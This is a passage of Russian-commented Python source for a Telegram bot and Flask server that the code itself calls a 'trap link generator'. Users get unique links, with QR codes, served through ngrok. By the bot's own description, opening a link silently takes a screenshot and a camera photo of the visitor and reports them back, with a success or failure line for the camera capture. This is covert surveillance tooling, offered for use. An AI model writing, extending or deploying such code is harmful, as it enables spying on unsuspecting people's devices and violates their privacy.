            f"📷 Камера: {'✅ Успешно' if camera_captured else '❌ Не удалось'}\n"
            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        bot.send_message(
            chat_id,
            message,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        print(f"Ошибка отправки отчета: {e}")
        return False

def send_telegram_qr_code(chat_id, url, caption):
    """Отправка QR-кода в Telegram"""
    try:
        # Генерируем QR-код
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Сохраняем во временный файл
        temp_file = f"temp_qr_{chat_id}_{int(time.time())}.png"
        img.save(temp_file)
        
        # Отправляем фото
        with open(temp_file, 'rb') as photo:
            bot.send_photo(
                chat_id,
                photo,
                caption=caption
            )
        
        # Удаляем временный файл
        os.remove(temp_file)
        
        return True
    except Exception as e:
        print(f"Ошибка отправки QR-кода: {e}")
        return False

def send_telegram_link_message(chat_id, link, name):
    """Отправка ссылки пользователю"""
    try:
        message = (
            f"🔗 *ВАША ССЫЛКА*\n\n"
            f"📝 Название: {name}\n"
            f"🔗 Ссылка: `{link}`\n\n"
            f"📱 *QR-код для быстрого доступа:*"
        )
        
        bot.send_message(
            chat_id,
            message,
            parse_mode='Markdown'
        )
        
        # Отправляем QR-код
        send_telegram_qr_code(chat_id, link, "Отсканируйте этот QR-код для быстрого перехода")
        
        return True
    except Exception as e:
        print(f"Ошибка отправки ссылки: {e}")
        return False

# ========== TELEGRAM БОТ КОМАНДЫ ==========

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Приветственное сообщение"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    
    # Регистрируем/обновляем пользователя
    user_id_db = create_or_update_user(chat_id, username, first_name, last_name)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔐 Войти на сайт")
    markup.add("📋 Мои ссылки")
    markup.add("ℹ️ Помощь")
    
    welcome_text = (
        f"👋 Привет, {first_name or 'пользователь'}!\n\n"
        f"🤖 Я бот для генерации ссылок-ловушек.\n\n"
        f"📋 *Что я умею:*\n"
        f"• Создавать уникальные ссылки\n"
        f"• Делать скриншот при переходе\n"
        f"• Делать фото с камеры (если доступно)\n"
        f"• Отправлять всё прямо сюда\n\n"
        f"🔐 *Чтобы начать:*\n"
        f"1. Нажмите кнопку 'Войти на сайт'\n"
        f"2. Я отправлю вам ссылку для входа\n"
        f"3. Перейдите по ссылке в браузере\n\n"
        f"🌐 *Сайт:* {NGROK_URL}\n"
        f"🆔 *Ваш ID:* `{user_id_db}`"
    )
    
    bot.send_message(
        chat_id,
        welcome_text,
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: m.text == "🔐 Войти на сайт")
def login_to_website(message):
    """Отправка ссылки для входа на сайт"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    
    # Регистрируем/обновляем пользователя
    user_id_db = create_or_update_user(chat_id, username, first_name, last_name)
    
    # Создаем сессию
    telegram_data = {
        'id': user_id,
        'username': username,
        'first_name': first_name,
        'last_name': last_name,
        'chat_id': chat_id
    }
    
    session_id = create_session(user_id_db, telegram_data)
    
    # Ссылка для входа
    login_url = f"{NGROK_URL}/api/telegram-login/{session_id}"
    
    # Создаем кнопку
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=login_url))
    
    # Отправляем инструкцию
    instructions = (
        f"🔐 *Ссылка для входа на сайт*\n\n"
        f"1. Нажмите кнопку ниже\n"
        f"2. Или перейдите по ссылке:\n"
        f"`{login_url}`\n\n"
        f"⚠️ *Внимание:*\n"
        f"• Ссылка действительна 1 час\n"
        f"• Не передавайте её другим\n"
        f"• После входа вы сможете создавать ссылки"
    )
    
    bot.send_message(
        chat_id,
        instructions,
        reply_markup=markup,
        parse_mode='Markdown'
    )
    
    # Отправляем QR-код для входа
    send_telegram_qr_code(chat_id, login_url, "QR-код для входа на сайт")

@bot.message_handler(func=lambda m: m.text == "📋 Мои ссылки")
def show_my_links(message):
    """Показать ссылки пользователя"""
    chat_id = message.chat.id
    user = get_user_by_chat_id(chat_id)
    
    if not user:
        bot.send_message(chat_id, "❌ Вы не зарегистрированы. Нажмите /start")
        return
    
    links = get_user_links(user['user_id'])
    
    if not links:
        bot.send_message(chat_id, "📭 У вас пока нет созданных ссылок")
        return
    
    # Отправляем первую ссылку с кнопками
    link = links[0]
    full_url = f"{NGROK_URL}/trap/{link['link_id']}"
    
    text = (
        f"🔗 *Ваша ссылка*\n\n"
        f"📝 Название: {link['name'] or 'Без названия'}\n"
        f"🆔 ID: `{link['link_id']}`\n"
        f"👆 Переходов: {link['clicks']}\n"
        f"📅 Создана: {link['created_at'][:10]}\n"
        f"🔗 Ссылка: `{full_url}`"
    )
    
    markup = types.InlineKeyboardMarkup()
    
    # Кнопка для копирования
    markup.add(types.InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link['link_id']}"))
    
    # Кнопка для просмотра QR-кода
    markup.add(types.InlineKeyboardButton("📱 QR-код", callback_data=f"qr_{link['link_id']}"))
    
    # Кнопка для просмотра следующей
    if len(links) > 1:
        markup.add(types.InlineKeyboardButton("➡️ Следующая ссылка", callback_data=f"next_1"))
    
    bot.send_message(
        chat_id,
        text,
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
def copy_link_callback(call):
    """Копирование ссылки"""
    link_id = call.data[5:]
    link = get_link(link_id)
    
    if link:
        full_url = f"{NGROK_URL}/trap/{link_id}"
        bot.answer_callback_query(call.id, f"✅ Ссылка скопирована!\n{full_url[:30]}...", show_alert=False)
    else:
        bot.answer_callback_query(call.id, "❌ Ссылка не найдена", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith('qr_'))
def qr_code_callback(call):
    """Показать QR-код ссылки"""
    link_id = call.data[3:]
    link = get_link(link_id)
    
    if link:
        full_url = f"{NGROK_URL}/trap/{link_id}"
        send_telegram_qr_code(call.message.chat.id, full_url, f"QR-код для ссылки: {link['name'] or 'Без названия'}")
        bot.answer_callback_query(call.id, "✅ QR-код отправлен!")
    else:
        bot.answer_callback_query(call.id, "❌ Ссылка не найдена", show_alert=True)

# ========== ЗАПУСК ==========

def run_bot():
    """Запуск Telegram бота"""
    print("🤖 Запуск Telegram бота...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Ошибка бота: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Инициализация базы данных
    init_db()
    
    # Запуск бота в отдельном потоке
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    print("=" * 60)
    print("🕵️‍♂️ ГЕНЕРАТОР ССЫЛОК-ЛОВУШЕК С TELEGRAM АВТОРИЗАЦИЕЙ")
    print("=" * 60)
    print(f"🌐 Внешний URL: {NGROK_URL}")
    print(f"🏠 Локальный URL: http://localhost:8080")
    print("🤖 Telegram бот запущен")
    print("🔐 Авторизация через Telegram активирована")
    print("🍪 Постоянные сессии на 90 дней")
    print("=" * 60)
    print("📋 Установите зависимости:")
    print("   pip install flask flask-session telebot requests qrcode[pil] pillow")
    print("=" * 60)
    print("🚀 Сервер запущен. После перезапуска сервера:")
    print("   • Пользователи останутся авторизованными")
    print("   • Все ссылки сохранятся")
    print("   • Сессии будут восстановлены из базы данных")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True, use_reloader=False)